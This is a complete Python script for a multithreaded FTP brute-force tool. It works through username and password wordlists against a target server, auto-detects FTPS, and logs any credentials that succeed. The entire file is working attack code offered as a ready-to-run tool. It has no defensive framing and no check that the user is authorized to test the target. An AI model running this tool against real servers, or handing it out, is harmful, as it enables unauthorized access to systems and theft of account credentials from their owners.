import os
import sys
import argparse
import threading
from queue import Queue
from datetime import datetime
from ftplib import FTP, FTP_TLS

print_lock = threading.Lock()

# -------------------------------
# Load wordlist (with built-in fallback)
# -------------------------------
def load_wordlist(filepath, default_list):
    if os.path.isfile(filepath):
        with open(filepath, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        print(f"[!] File not found: {filepath}. Using default list.")
        return default_list

# -------------------------------
# Logging utility
# -------------------------------
def log_event(filepath, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filepath, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

# -------------------------------
# Detect if FTPS is supported (improved with error print)
# -------------------------------
def detect_ftp_mode(target):
    try:
        ftp = FTP_TLS()
        ftp.connect(target, timeout=10)
        ftp.auth()
        ftp.prot_p()
        ftp.quit()
        return True
    except Exception as e:
        print(f"[!] FTPS detection failed: {e}")
        return False

# -------------------------------
# Thread worker
# -------------------------------
def worker(queue, target, use_tls, log_file, stop_flag):
    while True:
        if stop_flag["found"]:
            break

        try:
            username, password = queue.get_nowait()
        except Exception:
            break

        if stop_flag["found"]:
            queue.task_done()
            break

        try:
            ftp = FTP_TLS() if use_tls else FTP()
            ftp.connect(target, timeout=10)
            if use_tls:
                ftp.auth()
                ftp.prot_p()
            ftp.login(username, password)

            with print_lock:
                print(f"[✔] SUCCESS: {username}:{password}")
                log_event(log_file, f"SUCCESS: {username}:{password}")
            ftp.quit()
            stop_flag["found"] = True
        except Exception as e:
            with print_lock:
                print(f"[-] Failed: {username}:{password} ({e})")
        finally:
            queue.task_done()

# -------------------------------
# Main brute-force logic
# -------------------------------
def brute_force_ftp(target, userlist, passlist, output, threads, use_tls):
    # Load usernames from file, no fallback
    if os.path.isfile(userlist):
        with open(userlist, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        print(f"[!] Username file not found: {userlist}")
        return

    # Load passwords from file, no fallback
    if os.path.isfile(passlist):
        with open(passlist, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        print(f"[!] Password file not found: {passlist}")
        return

    if not usernames or not passwords:
        print("[!] Empty username or password list.")
        return

    if use_tls is None:
        use_tls = detect_ftp_mode(target)
        print(f"[~] Auto-detect: FTPS {'enabled' if use_tls else 'not supported'}, proceeding with {'FTPS' if use_tls else 'FTP'}")

    combo_queue = Queue()
    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

    print(f"[+] Starting brute-force on {target} using {threads} threads (TLS: {'ON' if use_tls else 'OFF'})")
    log_event(output, f"Brute-force started on {target} (TLS: {'ON' if use_tls else 'OFF'})")

    stop_flag = {"found": False}
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(combo_queue, target, use_tls, output, stop_flag))
        t.daemon = True
        t.start()

    combo_queue.join()

    if not stop_flag["found"]:
        print("[!] Brute-force complete. No valid credentials found.")
        log_event(output, f"No valid credentials found for {target}")

# -------------------------------
# Entry Point
# -------------------------------
banner = r"""
  ______ _______ _____            _             __                      
 |  ____|__   __|  __ \          | |           / _|                     
 | |__     | |  | |__) |__   ___ | |_ ___ _ __| |_ ___  ___ ___  _ __  
 |  __|    | |  |  ___/ _ \ / _ \| __/ _ \ '__|  _/ _ \/ __/ _ \| '_ \ 
 | |       | |  | |  | (_) | (_) | ||  __/ |  | ||  __/ (_| (_) | | | |
 |_|       |_|  |_|   \___/ \___/ \__\___|_|  |_| \___|\___\___/|_| |_|
                                                                       
                      🔐 FTP Brute-Force Tool
"""
print(banner)

def main():
    usage_text = "ftp_brute_forcer.py [-h] -t TARGET [-U USERLIST] [-P PASSLIST]"
    parser = argparse.ArgumentParser(
        description="🔐 FTP Brute-Forcer (Multithreaded + FTPS + Auto Wordlists)",
        usage=usage_text
    )
    parser.add_argument("-t", "--target", required=True, help="Target FTP server IP")
    parser.add_argument("-U", "--userlist", default="wordlists/usernames.txt", help="Username wordlist path")
    parser.add_argument("-P", "--passlist", default="wordlists/passwords.txt", help="Password wordlist path")
    parser.add_argument("-o", "--output", default="results.log", help="Log file path")
    parser.add_argument("--tls", action="store_true", help="Force FTP over TLS (FTPS)")
    parser.add_argument("--ftp", action="store_true", help="Force plain FTP (no TLS)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")

    args = parser.parse_args()

    if args.tls and args.ftp:
        print("[!] Cannot use both --tls and --ftp flags at the same time.")
        sys.exit(1)

    use_tls = None
    if args.tls:
        use_tls = True
    elif args.ftp:
        use_tls = False

    brute_force_ftp(args.target, args.userlist, args.passlist, args.output, args.threads, use_tls)

if __name__ == "__main__":
    main()
